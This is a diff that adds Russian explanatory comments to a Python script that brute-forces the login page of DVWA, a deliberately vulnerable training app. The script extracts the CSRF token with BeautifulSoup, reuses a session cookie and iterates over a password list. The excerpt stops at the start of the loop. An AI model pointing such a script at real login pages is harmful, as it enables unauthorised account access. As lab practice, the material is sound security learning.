@@ -6,14 +6,14 @@ success_message = 'Welcome to the password protected area admin'
 txt = open(filename)
 url = 'http://dvwa.local/vulnerabilities/brute/index.php'
 
-cookie = {'security': 'high', 'PHPSESSID': 'mlmi3nuh5pboft6bqpraql6aqr'}
+cookie = {'security': 'high', 'PHPSESSID': 'mlmi3nuh5pboft6bqpraql6aqr'} # куки нужны для входа на страницу задания bruteforce (иначе выкинет)
 s = requests.Session() # Объект Session позволяет сохранять определенные параметры между запросами. Он также сохраняет файлы cookie для всех запросов, сделанных из экземпляра Session
-target_page = s.get(url, cookies=cookie)
+target_page = s.get(url, cookies=cookie) #отправляем get-запрос
 
 
 def checkSuccess(html):
-    soup = Soup(html, 'html.parser')
-    search = soup.findAll(text=success_message)
+    soup = Soup(html, 'html.parser') #парсим страницу
+    search = soup.findAll(text=success_message) #ищем сообщение, что нам удалось войти
 
     if not search:
         success = False
@@ -24,7 +24,7 @@ def checkSuccess(html):
 
 page_source = target_page.text
 soup = Soup(page_source, 'html.parser')
-csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value') # Поиск всех совпадений в строке.
+csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value') #вылавливаем значение csrf-токена через findAll. Поиск всех совпадений в строке.
 with open(filename) as f:
     print('Begin...')
     for password in f:
